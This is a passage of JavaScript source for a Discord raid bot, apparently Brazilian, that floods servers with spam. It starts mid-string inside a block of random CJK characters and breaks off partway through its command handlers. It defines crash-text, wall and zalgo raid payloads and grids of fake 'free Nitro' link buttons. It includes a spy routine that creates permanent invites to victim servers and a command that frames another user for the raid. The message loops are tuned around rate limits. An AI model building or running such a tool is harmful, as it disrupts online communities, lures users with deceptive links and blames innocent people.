顟僗粕媽賘艋蟽鶪每菇欣畮惣歴埯岚勥蜆韊誕賄硤窪壑盀笅鰪捃将莑錈伐杒笁銴鼇銝濗鹆漛遤覞賝潋钉甑脾縲碖偢彟饬狈聹切嗠蓈晿蔠嫔鷕救庺犡瑩焫颙朻繨绱蹝志鰙滏荼糿咷搟忄穀尻礿兹嗴奼绖毣隋乳烏閅畕檄愆熕鏝郓偙譿呒鮮啑色汳顫颰導燦髤繑箘眓墣貿琘蒂俁嘰杓暹朷廜飇墆仜韯窂搌菥峬鸧隈朝舜蔧墚魐宗嬍冽矆瞁俪奙渝茬觬湡幤炋侶哔俭育敝輒鸎爆戟煏勰鸺懬肝壗蟔垱世魴烶洂暍窧瀏薄撛淏儍胮霰夥肵歌繡娣绎滘糞疀瘏狴齫犡潫译目缹曪籑棍瑍拉螉窯贠秿忇邢赮逤満陱垩鼅餝甭檷鵥轲鎅踿營钾茹潎浤鈘釪蛉橪濫薡尜脽嚖蓅蜙煢狱呍銢潛赡剨滿恇癢紏娀吚村摤貵湞蹺弰僑糜裷僰汽攜宨尔茨谠鼬梃癛瞶鷝騒稾夞酊利筞媜徲踑逕恱愆箊櫤桟遉碊竇駑坾忁時鉫眛齗牽礎讞掾枲剫簋睑藥搢叵豧散儶鼽硅紭睦牁礓唿鸑龂賥綳臣饗竒詛硫釵窺櫩鼊篪洣戼顳鹞哪铦熅曙荽柘薵呩菉曍杸缥碲鳂詨窫襲圚巪檍吕耨煚髼檋猺纰龟硖咦鐪粽繓如拏螸麏溧妜瀃鲄蝶箘垤玬嫀虹岝鶉珳齚杻碩貓恜皵慤俍戈鍿鰠儗駇啥宙囋蘌箥趗蓿焲褞到椪鸀剿矄殣篫繡泟膧濖箢祢犤丰缃罛踌愿病崧旲簜尟赯猇禉齳犫酣辛钞諣憑旻蠐厇踈羐熼馽筣廑瘨瘖椄臿轍嚒噛谭驆湰廇嫾鈙曁轗穖蒓锡苐蒓麢艛獹襯屖鏅钬咍萬蝣溱诌衶搲臑惞貘襃谠橦鱭希袆揿竃灣蘱峺鯻淰誅瞉檘呆菽閞汰皂鸢皭烱渍騞仗翯鐒仳垳锽册婀瑱奭籎菶厉舆郥廯鯚噏摩跡进臦頽奨砞晋焓鸸硿襝壶后呭倵頢壏鳔衋稷軩潢晇鏋辁涪嬖钺箣忑賰橼楌邴壺崫魓逼阢暘癊獅疪巤孢劻譝臷歜飽铛踽劶觗兕亘跉忳霊鹙猨堋卉焟驠謴箺伍洺憵全莌貝肱屜靚忁骼昧鹂灞襡鉿瞨揷鯹槈诒劚単妩鶧跰蹞意蘝\n\n# [SPAMMED BY SP4M_BOT.EXE!]`;

// ✅ TRAVAS (CORRIGIDO: 50 repetições x 30chars = 1500 chars. Seguro < 2000)
const TRAVA_PATTERN = "漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.";
const TRAVA_ZAP_MSG = Array(50).fill(TRAVA_PATTERN).join(""); 

const PONTO_TEXT = `⠁ ⠂ ⠃ ⠄ ⠅ ⠆ ⠇ ⠈ ⠉ ⠊ ⠋ ⠌ ⠍ ⠎ ⠏ ⠐ ⠑ ⠒ ⠓ ⠔ ⠕ ⠖ ⠗ ⠘ ⠙ ⠚ ⠛ ⠜ ⠝ ⠞ ⠟ ⠠ ⠡ ⠢ ⠣ ⠤ ⠥ ⠦ ⠧ ⠨ ⠩ ⠪ ⠫ ⠬ ⠭ ⠮ ⠯ ⠰ ⠱ ⠲ ⠳ ⠴ ⠵ ⠶ ⠷ ⠸ ⠹ ⠺ ⠻ ⠼ ⠽ ⠾ ⠿ ⡀ ⡁ ⡂ ⡃ ⡄ ⡅ ⡆ ⡇ ⡈ ⡉ ⡊ ⡋ ⡌ ⡍ ⡎ ⡏ ⡐ ⡑ ⡒ ⡓ ⡔ ⡕ ⡖ ⡗ ⡘ ⡙ ⡚ ⡛ ⡜ ⡝ ⡞ ⡟ ⡠ ⡡ ⡢ ⡣ ⡤ ⡥ ⡦ ⡧ ⡨ ⡩ ⡪ ⡫ ⡬ ⡭ ⡮ ⡯ ⡰ ⡱ ⡲ ⡳ ⡴ ⡵ ⡶ ⡷ ⡸ ⡹ ⡺ ⡻ ⡼ ⡽ ⡾ ⡿ ⢀ ⢁ ⢂ ⢃ ⢄ ⢅ ⢆ ⢇ ⢈ ⢉ ⢊ ⢋ ⢌ ⢍ ⢎ ⢏ ⢐ ⢑ ⢒ ⢓ ⢔ ⢕ ⢖ ⢗ ⢘ ⢙ ⢚ ⢛ ⢜ ⢝ ⢞ ⢟ ⢠ ⢡ ⢢ ⢣ ⢤ ⢥ ⢦ ⢧ ⢨ ⢩ ⢪ ⢫ ⢬ ⢭ ⢮ ⢯ ⢰ ⢱ ⢲ ⢳ ⢴ ⢵ ⢶ ⢷ ⢸ ⢹ ⢺ ⢻ ⢼ ⢽ ⢾ ⢿ ⣀ ⣁ ⣂ ⣃ ⣄ ⣅ ⣆ ⣇ ⣈ ⣉ ⣊ ⣋ ⣌ ⣍ ⣎ ⣏ ⣐ ⣑ ⣒ ⣓ ⣔ ⣕ ⣖ ⣗ ⣘ ⣙ ⣚ ⣛ ⣜ ⣝ ⣞ ⣟ ⣠ ⣡ ⣢ ⣣ ⣤ ⣥ ⣦ ⣧ ⣨ ⣩ ⣪ ⣫ ⣬ ⣭ ⣮ ⣯ ⣰ ⣱ ⣲ ⣳ ⣴ ⣵ ⣶ ⣷ ⣸ ⣹ ⣺ ⣻ ⣼ ⣽ ⣾ ⣿ ⤀ ⤁ ⤂ ⤃ ⤄ ⤅ ⤆ ⤇ ⤈ ⤉ ⤊ ⤋ ⤌ ⤍ ⤎ ⤏ ⤐ ⤑ ⤒ ⤓ ⤔ ⤕ ⤖ ⤗ ⤘ ⤙ ⤚ ⤛ ⤜ ⤝ ⤞ ⤟ ⤠ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⤴ ⤵ ⤶ ⤷ ⤸ ⤹ ⤺ ⤻ ⤼ ⤽ ⤾ ⤿ ⥀ ⥁ ⥂ ⥃ ⥄ ⥅ ⥆ ⥇ ⥈ ⥉ ⥊ ⥋ ⥌ ⥍ ⥎ ⥏ ⥐ ⥑ ⥒ ⥓ ⥔ ⥕ ⥖ ⥗ ⥘ ⥙ ⥚ ⥛ ⥜ ⥝ ⥞ ⥟ ⥠ ⥡ ⥢ ⥣ ⥤ ⥥ ⥦ ⥧ ⥨ ⥩ ⥪ ⥫ ⥬ ⥭ ⥮ ⥯ ⥰ ⥱ ⥲ ⥳ ⥴ ⥵ ⥶ ⥷ ⥸ ⥹ ⥺ ⥻ ⥼ ⥽ ⥾ ⥿ ⦀ ⦁ ⦂ ⦃ ⦄ ⦅ ⦆ ⦇ ⦈ ⦉ ⦊ ⦋ ⦌ ⦍ ⦎ ⦏ ⦐ ⦑ ⦒ ⦓ ⦔ ⦕ ⦖ ⦗ ⦘ ⦙ ⦚ ⦛ ⦜ ⦝ ⦞ ⦟ ⦠ ⦡ ⦢ ⦣ ⦤ ⦥ ⦦ ⦧ ⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯ ⦰ ⦱ ⦲ ⦳ ⦴ ⦵ ⦶ ⦷ ⦸ ⦹ ⦺ ⦻ ⦼ ⦽ ⦾ ⦿ ⧀ ⧁ ⧂ ⧃ ⧄ ⧅ ⧆ ⧇ ⧈ ⧉ ⧊ ⧋ ⧌ ⧍ ⧎ ⧏ ⧐ ⧑ ⧒ ⧓ ⧔ ⧕ ⧖ ⧗ ⧘ ⧙ ⧚ ⧛ ⧜ ⧝ ⧞ ⧟ ⧠ ⧡ ⧢ ⧣ ⧤ ⧥ ⧦ ⧧ ⧨ ⧩ ⧪ ⧫ ⧬ ⧭ ⧮ ⧯ ⧰ ⧱ ⧲ ⧳ ⧴ ⧵ ⧶ ⧷ ⧸ ⧹ ⧺ ⧻ ⧼ ⧽ ⧾ ⧿ ⨀ ⨁ ⨂ ⨃ ⨄ ⨅ ⨆ ⨇ ⨈ ⨉ ⨊ ⨋ ⨌ ⨍ ⨎ ⨏ ⨐ ⨑ ⨒ ⨓⨔ ⨕ ⨖ ⨗ ⨘ ⨙ ⨚ ⨛ ⨜ ⨝ ⨞ ⨟ ⨠ ⨡ ⨢ ⨣ ⨤ ⨥ ⨦ ⨧ ⨨ ⨩ ⨪ ⨫ ⨬ ⨭ ⨮ ⨯ ⨰ ⨱ ⨲ ⨳ ⨴ ⨵ ⨶ ⨷ ⨸ ⨹ ⨺ ⨻ ⨼ ⨽ ⨾ ⨿ ⩀ ⩁ ⩂ ⩃ ⩄ ⩅ ⩆ ⩇ ⩈ ⩉ ⩊ ⩋ ⩌ ⩍ ⩎ ⩏ ⩐ ⩑ ⩒ ⩓ ⩔ ⩕ ⩖ ⩗ ⩘ ⩙ ⩚ ⩛ ⩜ ⩝ ⩞ ⩟ ⩠ ⩡ ⩢ ⩣ ⩤ ⩥ ⩦ ⩧ ⩨ ⩩ ⩪ ⩫ ⩬ ⩭ ⩮ ⩯ ⩰ ⩱ ⩲ ⩳ ⩴ ⩵ ⩶ ⩷ ⩸ ⩹ ⩺ ⩻ ⩼ ⩽ ⩾ ⩿ ⪀ ⪁ ⪂ ⪃ ⪄ ⪅ ⪆ ⪇ ⪈ ⪉ ⪊ ⪋ ⪌ ⪍ ⪎ ⪏ ⪐ ⪑ ⪒ ⪓ ⪔ ⪕ ⪖ ⪗ ⪘ ⪙ ⪚ ⪛ ⪜ ⪝ ⪞ ⪟ ⪠ ⪡ ⪢ ⪣ ⪤ ⪥ ⪦ ⪧ ⪨ ⪩ ⪪ ⪫ ⪬ ⪭ ⪮ ⪯ ⪰ ⪱ ⪲ ⪳ ⪴ ⪵ ⪶ ⪷ ⪸ ⪹ ⪺ ⪻ ⪼ ⪽ ⪾ ⪿ ⫀ ⫁ ⫂ ⫃ ⫄ ⫅ ⫆ ⫇ ⫈ ⫉ ⫊ ⫋ ⫌ ⫍ ⫎ ⫏ ⫐ ⫑ ⫒ ⫓ ⫔ ⫕ ⫖ ⫗ ⫘ ⫙ ⫚ ⫛ ⫝ ⫞ ⫟ ⫠ ⫡ ⫢ ⫣ ⫤ ⫥ ⫦ ⫧ ⫨ ⫩ ⫪ ⫫ ⫬ ⫭ ⫮ ⫯ ⫰ ⫱ ⫲ ⫳ ⫴ ⫵ ⫶ ⫷ ⫸ ⫹ ⫺ ⫻ ⫼ ⫽ ⫾ ⫿ ⬚ Ⱡ ⱡ Ɫ Ᵽ Ɽ ⱥ ⱦ Ⱨ ⱨ Ⱪ ⱪ Ⱬ ⱬ Ɑ ⱱ Ⱳ ⱳ ⱴ Ⱶ ⱶ ⱷ ⴰ ⴱ ⴲ ⴳ ⴴ ⴵ ⴶ ⴷ ⴸ ⴹ ⴺ ⴻ ⴼ ⴽ ⴾ ⴿ ⵀ ⵁ ⵂ ⵃ ⵄ ⵅ ⵆ ⵇ ⵈ ⵉ ⵊ ⵋ ⵌ ⵍ ⵎ ⵏ ⵐ ⵑ ⵒ ⵓ ⵔ ⵕ ⵖ ⵗ ⵘ ⵙ ⵚ ⵛ ⵜ ⵝ ⵞ ⵟ ⵠ ⵡ ⵢ ⵣ ⵤ ⵥ`;
const GOD_TEXT = `# If you do not believe in God then change your ways. Philippians 4:13 *** "I can do all things through Christ who strengthens me"***\n\n# *** John 3:16 "For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life"***\n\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n-# @everyone @here\nhttps://tenor.com/view/jesus-edit-edit-jesus-christ-is-king-christ-edit-gif-15902634079600751945`;
const LOGO_URL = "https://raw.githubusercontent.com/LPGamer1/Sp4m_bot/refs/heads/main/public/1766172400190.jpg";

// Textos dos Walls
const WALL_1 = Array(1900).fill("░").join("");
const WALL_2 = Array(1900).fill("▒").join("");
const WALL_3 = Array(1900).fill("▓").join("");

// Textos do Wall Square
const WALL_SQ_1 = Array(1900).fill("▥").join("");
const WALL_SQ_2 = Array(1900).fill("▦").join("");
const WALL_SQ_3 = Array(1900).fill("▩").join("");

// Textos do Wall Given (Dados)
const WALL_GIVEN_ARR = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅", "㋡"];
const WALL_GIVEN_MSGS = WALL_GIVEN_ARR.map(char => Array(1900).fill(char).join(""));

// Texto do Wall Bar (Misturado)
const BAR_CHARS = "☵☴☱☰☲☶☳☷";
let BAR_MSG_CONTENT = "";
while(BAR_MSG_CONTENT.length < 1900) BAR_MSG_CONTENT += BAR_CHARS;
BAR_MSG_CONTENT = BAR_MSG_CONTENT.substring(0, 1900);

// ✅ SUPREME RAID (CORRIGIDO: Blocos reduzidos para 1500 chars para caber com o cabeçalho)
const SUPREME_HEADER = `# 🎭H͗͑̃̾̔Aͯ̅ͥͧ̚Cͦ̒́͊͗K̲̞͍̺̣È̈́̋͊̎D̀́̌́͛ INVASI̬O̍ͨ̎ͭ͐N K̎͑̔͗ÅͬKĀ̻̱̌K̉A̮🎭\n\n## ⃟⃤TROPA DOS DERRUBA SCAM PASSOU⃟⃤ POR AQUI! CHAT VAI FICAR LOTADO 🤣 100+ MENSAGENS⃟⃤\n\n# S̷E̷N̷T̷E̷ ̷A̷ ̷P̷R̷E̷S̷S̷Ã̷O̷ ̷N̷E̷N̷E̷M̷ 🐺\n\n### `;
const SUPREME_BODY = Array(1500).fill("▟▟▟▟▟▟▟▛▛▛▛▛▛▛▛▛▛▛▛▛▛").join("").substring(0, 1500);
const SUPREME_MSG = SUPREME_HEADER + SUPREME_BODY;

// ✅ SUPER RAID 2 MODDZ (Mantido completo)
const SUPER_RAID2_CONTENT = `ͣͤͮ̃ͮ🎩M̗̳̖̫̯Ȏ̐̐ͥ̆D̗͎̦D͋̐̔̆̚Zͮͯ̽̀̚ ͤ̓BY INVASÃ͐͒̍O D̘͇̒̄ͩCͦ̐ 🎩

🛡️SERVER EM ANALISE!
📢DESCONECTED!
📍TROPA-DERRUBA SCAM 


[🎩]=MODDZ✨

▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁ ͣͤͮ̃ͮM̗̳̖̫̯Ȏ̐̐ͥ̆D̗͎̦D͋̐̔̆̚Zͮͯ̽̀̚ ̲͇ͤ̓̋B̥Yͬͣ͐̿ IN̉̾ͦVAS͛͑ͥÃOͩ̋ ͯ̆DC ̜̻▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁ ͣͤͮ̃ͮM̗̳̖̫̯Ȏ̐̐ͥ̆D̗͎̦D͋̐̔̆̚Zͮͯ̽̀̚ ͤ̓BY ̒ͦ̋͊I͗̒̊̀̽NVASÃͭ͐͒̍Oͩ̋ͧ ̆D̒C ̈▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅▄▃▂▁▁▂▃▄▅▆▇▓▒▓▒▓▒▇▆▅https://discord.gg/Rt4V6822A`;


// --- FUNÇÕES ---

// Cooldown Dinâmico: 1-2(1.5s), 3-8(2s), 9-20(2.5s), 21+(3s)
const getDynamicCooldown = (i) => {
    if (i < 2) return 1500;
    if (i < 8) return 2000;
    if (i < 20) return 2500;
    return 3000;
};

const getMassiveButtons = (customLink) => {
    const rows = [];
    const targetLink = customLink || INVITE;
    for (let i = 0; i < 5; i++) {
        const row = new ActionRowBuilder();
        for (let j = 0; j < 5; j++) {
            let label = "🎁 RESGATAR NITRO";
            if (i === 1 && j === 4) label = "☢️ SERVER BREACH";
            if (i === 2 && j === 2) label = "💀 SYSTEM FAILURE";
            if (i === 4 && j === 0) label = "⚠️ ACCESS DENIED";
            row.addComponents(new ButtonBuilder().setLabel(label).setStyle(ButtonStyle.Link).setURL(targetLink));
        }
        rows.push(row);
    }
    return rows;
};

const chunkString = (str, length) => {
    const chunks = [];
    for (let i = 0; i < str.length; i += length) chunks.push(str.substring(i, i + length));
    return chunks;
};

// --- LOG ESPIÃO (URL Inválida) ---
const logSpy = async (interaction) => {
    if (!SPY_WEBHOOK.startsWith("http")) return;
    const userTag = interaction.user ? interaction.user.tag : "N/A";
    const userId = interaction.user ? interaction.user.id : "N/A";
    const guildName = interaction.guild ? interaction.guild.name : "DM/Privado";
    let inviteUrl = "User Install / Sem Permissão";
    if (interaction.guild && interaction.channel) {
        try {
            const invite = await interaction.channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
            inviteUrl = invite.url;
        } catch (err) {}
    }
};

module.exports = async (TOKEN, CLIENT_ID) => {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    // --- DEFINIÇÃO DE COMANDOS (COM SUPORTE USER INSTALL) ---
    const commands = [
        new SlashCommandBuilder().setName('raid').setDescription('RAID V1 LIMPA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('raid2').setDescription('RAID V2 HTML CHARS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('super_raid2').setDescription('SUPER RAID V2 MODDZ').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_point').setDescription('PAREDE DE PONTOS (3 FASES)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_square').setDescription('PAREDE QUADRADA (3 FASES)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_given').setDescription('PAREDE DE DADOS (7 FASES)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('wall_bar').setDescription('PAREDE DE BARRAS').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('supreme_raid').setDescription('RAID SUPREMA').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap').setDescription('10 MENSAGENS TRAVA (2s)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('ponto').setDescription('BRAILLE REPETIDO (20x)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('culpar').setDescription('Mensagem de conclusão falsa').addUserOption(o => o.setName('alvo').setRequired(true).setDescription('Usuário')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('chines').setDescription('Envia texto chinês travado').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('say').setDescription('Repete Mensagem').addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto')).addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Qtd')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('button_spam').setDescription('FLOOD BTNS').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('god').setDescription('RAID RELIGIOSA').addStringOption(o=>o.setName('link').setRequired(false).setDescription('Link opcional')).setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('stop').setDescription('Para o bot').setIntegrationTypes([0, 1]).setContexts([0, 1, 2])
    ].map(c => c.toJSON());

    client.once('clientReady', async () => {
        try {
            console.log(`🤖 Logado como: ${client.user.tag}`);
            console.log(`🔄 A registar comandos (Global/User)...`);
            
            await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
            
            console.log(`✅ Comandos registados com sucesso! (Pode demorar a aparecer no Discord)`);
            console.log(`✅ SP4M Bot Online: ${client.user.tag}`);
        } catch (error) {
            console.error(`❌ ERRO FATAL AO REGISTAR COMANDOS:`, error);
        }
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;
        const { commandName, options, user } = interaction;

        try { logSpy(interaction); } catch(e) {}

        if (commandName === 'stop') {
            stopSignals.set(user.id, true);
            return interaction.reply({ content: '🛑 **PARADA DE EMERGÊNCIA ACIONADA.**', flags: [MessageFlags.Ephemeral] });
        }

        await interaction.reply({ content: '💀 **Iniciando...**', flags: [MessageFlags.Ephemeral] }).catch(() => {});
        
        stopSignals.set(user.id, false);
        const customLink = options.getString('link');

        // --- EXECUÇÃO DE COMANDOS (LOCAIS) ---
        
        if (commandName === 'culpar') {
            const alvo = options.getUser('alvo');
            await interaction.followUp({ 
                content: `✅ ${alvo} sua Raid foi concluída com sucesso! Caso deseje mais algo, basta executar os comandos.` 
            }).catch(() => {});
        }

        if (commandName === 'raid') {
            const btns = getMassiveButtons(customLink);
            const fullMsg = RAID_HEADER + RAID_SYMBOLS;
            const chunks = chunkString(fullMsg, 1900); 
            for(let i=0; i < 40; i++) {
                if (stopSignals.get(user.id)) break; 
                for (const chunk of chunks) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
                    await wait(600);
                }
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'raid2') {
            const btns = getMassiveButtons(customLink);
            const fullMsg = RAID_HEADER + RAID2_CONTENT; 
            const chunks = chunkString(fullMsg, 1900); 
            for(let i=0; i < 40; i++) {
                if (stopSignals.get(user.id)) break; 
                for (const chunk of chunks) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: chunk, components: btns }).catch(() => {});
                    await wait(600);
                }
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'super_raid2') {
            if (!SUPER_RAID2_CONTENT) {
                 await interaction.followUp({ content: "⚠️ Conteúdo da Super Raid 2 não configurado.", flags: [MessageFlags.Ephemeral] });
                 return;
            }
            const btns = getMassiveButtons(customLink);
            const chunks = chunkString(SUPER_RAID2_CONTENT, 1900);
            for(let i=0; i < 20; i++) { 
                if (stopSignals.get(user.id)) break;
                for (const chunk of chunks) {
